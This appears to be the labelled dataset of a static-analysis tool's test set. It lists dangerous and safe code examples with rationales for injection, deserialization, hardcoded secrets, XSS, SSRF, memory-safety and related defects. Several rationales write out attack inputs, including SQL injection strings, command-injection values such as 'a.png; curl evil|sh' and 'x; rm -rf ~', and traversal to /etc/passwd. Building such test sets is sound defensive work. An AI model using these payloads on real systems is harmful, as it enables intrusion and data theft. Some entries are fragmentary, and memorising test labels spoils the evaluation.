scope: The built-in rule engine of the analyzer (src/tools/static_scan.scan_material): no model, no network. Languages: those the engine has rules or detection for. Go has only the language-independent rules.
does_not_measure: The hub's verdicts with a model: the model proposes and the rules decide there, and none of that is exercised here. A result in this set says what the rules alone do.

label_meaning.dangerous: contains at least one real, exploitable defect, listed under 'expected'
label_meaning.safe: contains no defect of the classes in this set; may look like a dangerous example on purpose

criticality_meaning.critical: remote, unauthenticated code execution, full data read/write, or a live credential in source
criticality_meaning.high: serious compromise that needs a precondition (a victim's browser, a reachable internal host, a file path)
criticality_meaning.medium: weakens a defence or makes a later attack easier

expected_meaning: cwe + line: a finding is a hit when it names the same CWE on the same line. line 0 means the defect belongs to the whole file and any line counts. Expectations were written from the code, not copied from the engine's output.

examples.label: dangerous

expected.why: request argument inside the query text

examples.rationale: A request argument is interpolated into the SQL text with an f-string. ?name=' OR '1'='1 returns every row; a stacked or UNION payload reads other tables. Remote, unauthenticated, full read of the database.

examples.label: dangerous
examples.rationale: % formatting builds the query string before the driver sees it, so it is string interpolation, not parameter binding (binding would pass the value as a second argument). order_id comes from the URL.

examples.label: dangerous

expected.why: user input reaches a shell command line

examples.rationale: The host comes from the request and is concatenated into a shell command. host=8.8.8.8;cat /etc/passwd runs an arbitrary command as the service user.

examples.label: dangerous
examples.rationale: shell=True with an f-string that contains a user-controlled filename: a name such as 'a.png; curl evil|sh' executes a second command.

examples.label: dangerous
examples.rationale: eval() on a request parameter executes arbitrary Python: ?expr=__import__('os').system('id').

examples.label: dangerous
examples.rationale: The session cookie is attacker-controlled and is unpickled; a crafted pickle runs code on load (__reduce__).

examples.label: dangerous

expected.why: cloud access key id in source

examples.rationale: A cloud access key id is committed in source. Anyone with read access to the repository (or a leaked container image) can use it. AKIAIOSFODNN7EXAMPLE is AWS's documented placeholder; the shape is what matters.

examples.label: dangerous

expected.why: full YAML loader on untrusted input

examples.rationale: yaml.load without a safe loader constructs arbitrary Python objects from the document; an uploaded config can execute code (!!python/object/apply).

examples.label: dangerous
examples.rationale: The file name from the query string is joined to the upload directory with no check that the result stays inside it: ?name=../../etc/passwd reads any file the service can read.

examples.label: dangerous

expected.why: server-side request to a client-chosen URL

examples.rationale: The server fetches any URL the client names, including http://169.254.169.254/ (cloud metadata) and internal hosts, and returns the body.

examples.label: dangerous
examples.rationale: Certificate verification is disabled for a call that carries an API token, so a network attacker can impersonate the server and read the token.

examples.label: dangerous
examples.rationale: The database password is a string literal in the source: it ships with every copy of the code and cannot be rotated without a release.

examples.label: dangerous

expected.why: user input in HTML without escaping

examples.rationale: The query parameter is concatenated into an HTML response with no escaping: ?name=<script>...</script> runs in the victim's browser (reflected XSS).

examples.label: dangerous
examples.rationale: The template source itself is built from user input and rendered: {{ config }} leaks settings, and a gadget chain gives code execution (server-side template injection).

examples.label: dangerous
examples.rationale: The invoice is looked up by the id in the URL and returned without checking that it belongs to the logged-in user: changing the number reads other customers' invoices (insecure direct object reference). Needs semantic understanding of ownership; a line pattern cannot see it.

examples.label: dangerous
examples.rationale: Passwords are stored as unsalted MD5: fast to brute-force and rainbow-table friendly. A database leak turns into mass credential recovery.

examples.label: dangerous

expected.why: non-cryptographic PRNG for a security token

examples.rationale: A password-reset token is drawn from the random module (Mersenne Twister): its state can be recovered from observed outputs, so tokens become predictable. secrets.token_urlsafe is the correct source.

examples.label: dangerous

expected.why: debug mode on a network-reachable server

examples.rationale: The Flask debugger is enabled on a server that listens on all interfaces: the Werkzeug console allows code execution for anyone who can reach the port (and, if the PIN is guessable, without it).

examples.label: dangerous

expected.why: redirect target taken from the request

examples.rationale: After login the user is redirected to whatever ?next= says, so a phishing link on the real domain can send victims to an attacker's site.

examples.label: safe
examples.rationale: The value is passed as a bound parameter (second argument), never spliced into the SQL text; the table and column names are fixed literals; the route requires a logged-in user.

examples.label: safe
examples.rationale: No shell: arguments are a list, and the host is validated as an IP address before use, so there is nothing to inject into.

examples.label: safe
examples.rationale: yaml.safe_load builds only plain data types; the JSON path is plain parsing. Neither can construct objects; the route requires a logged-in user.

examples.label: safe
examples.rationale: The requested name is reduced to its base name and the resolved path is checked to be inside the upload directory before it is opened.

examples.label: safe
examples.rationale: The password comes from the environment, tokens use the secrets module, and passwords are hashed with scrypt and a per-user random salt.

examples.label: safe
examples.rationale: The fetched host must be on an allowlist, certificate verification is left on, the timeout is set, and the template is a file with autoescaping (the user text is data, not template source).

examples.label: dangerous
examples.rationale: The route parameter is concatenated into the SQL string: /users/1 OR 1=1 returns every user, and a UNION payload reads other tables.

examples.label: dangerous

expected.why: query parameter reaches a shell command

examples.rationale: child_process.exec runs its argument through a shell; the directory comes from the query string, so ?dir=.;cat /etc/passwd executes a second command.

examples.label: dangerous
examples.rationale: eval() on the request body executes arbitrary JavaScript in the server process.

examples.label: dangerous
examples.rationale: The URL fragment is written to innerHTML: a link ending in # runs script in the page (DOM XSS).

examples.label: dangerous

examples.label: dangerous
examples.rationale: The token is verified with the 'none' algorithm allowed, so an attacker can forge a token with an empty signature and any claims.

examples.label: dangerous
examples.rationale: The HTTPS agent is told not to reject unauthorised certificates, so any certificate (including an attacker's) is accepted for requests that carry credentials.

examples.label: dangerous

expected.why: non-cryptographic PRNG for a session id

examples.rationale: Session identifiers come from Math.random(), which is not cryptographically secure and is predictable once a few outputs are observed.

examples.label: dangerous
examples.rationale: Every origin is allowed and credentials are enabled, so any website can make authenticated calls on behalf of a logged-in visitor.

examples.rationale: The id is passed as a bound parameter ($1) and the SQL text is a constant.

examples.label: safe

examples.label: safe
examples.rationale: Identifiers come from the crypto module's CSPRNG; the JWT verification pins HS256 and reads the key from the environment; the file name is reduced to its base name.

examples.label: dangerous

expected.why: user input appended to a command line

examples.rationale: The host is appended to a command string passed to Runtime.exec; on a platform that tokenises on spaces an attacker adds arguments, and wrappers such as sh -c make full injection trivial.

examples.label: dangerous
examples.rationale: Java deserialization of the raw request body: a gadget chain on the classpath gives remote code execution.

examples.rationale: DocumentBuilderFactory is used with its defaults, so external entities and DTDs are resolved: a crafted XML reads local files or makes server-side requests (XXE).

examples.label: dangerous
examples.rationale: The administrator password is a constant in the compiled class; it cannot be rotated without a release and is visible to anyone who can decompile the jar.

examples.label: dangerous
examples.rationale: MD5 is used to hash passwords: unsalted, fast, collision-broken.

examples.label: safe
examples.rationale: PreparedStatement with a bound parameter; the SQL text is constant.

examples.label: safe
examples.rationale: ProcessBuilder with separate arguments (no shell), and the host is parsed as an IP literal first.

examples.label: safe
examples.rationale: The XML factory forbids DTDs and external entities before parsing.

examples.label: safe
examples.rationale: Password hashing with PBKDF2 and a random per-password salt; the stored credential is read from configuration.

examples.label: dangerous

expected.why: unbounded read into a fixed buffer

examples.rationale: gets() reads a line of unbounded length into a 64-byte buffer: any longer input overwrites the stack. The function was removed from the C standard because it cannot be used safely.

examples.label: dangerous

expected.why: user-controlled text passed to the shell

examples.rationale: The host from the command line is formatted into a shell command and passed to system(): 'x; rm -rf ~' runs a second command.

examples.label: dangerous

expected.why: unchecked copy into a fixed buffer

examples.rationale: argv[1] is copied into a 16-byte buffer with strcpy, which does not check the length.

examples.label: dangerous

expected.why: input used as a format string

examples.rationale: Input is passed as the format string itself, so %x and %n let the sender read or write memory.

examples.label: dangerous
examples.rationale: scanf with a bare %s has no width limit and overflows the 32-byte buffer on long input.

examples.label: dangerous
examples.rationale: The buffer is freed and then written through the same pointer. Needs lifetime reasoning; no single-line pattern identifies it.

examples.label: dangerous
examples.rationale: count * size can wrap around, so malloc returns a small buffer that the following loop overruns. Needs arithmetic reasoning.

examples.label: safe
examples.rationale: Bounded read with fgets, and the output uses a constant format string.

examples.label: safe
examples.rationale: Length is checked, the copy is bounded and terminated, and the format string is a literal.

examples.label: safe
examples.rationale: No shell: the program and its arguments are passed to execvp separately, after the host is checked against a fixed character set.

examples.label: dangerous

expected.why: unchecked copy into a fixed member buffer

examples.rationale: strcpy into a fixed member array with a caller-supplied C string: overflows the object and its neighbours.

examples.label: dangerous

expected.why: user-influenced string executed by the shell

examples.rationale: A std::string built from user input is handed to system(), which runs it through the shell.

expected.why: message used as a format string

examples.rationale: The message text is used as the printf format.

examples.label: safe
examples.rationale: std::string manages its own storage, so there is no fixed buffer to overrun.

examples.label: safe

examples.rationale: hostNetwork puts the pod in the node's network namespace: it can reach node-local services and sniff host traffic. Not a privileged flag, so a rule looking only for privileged: true misses it.

examples.label: safe
examples.rationale: The host must parse as an IP address before it is used, and it is escaped with escapeshellarg on the same line as the call. Added with the PHP rule, which can see an escape on the same line only: the two-line form in php-safe-json-escapeshellarg is the same safe code and is reported, which is a known limit of a line-based rule.

rules_written_after_meaning: an example with rules_written_after: true is one the rules were extended for after the first run (labelled/RESULTS.before-rules.md): it guards against regression but is not independent evidence of recall
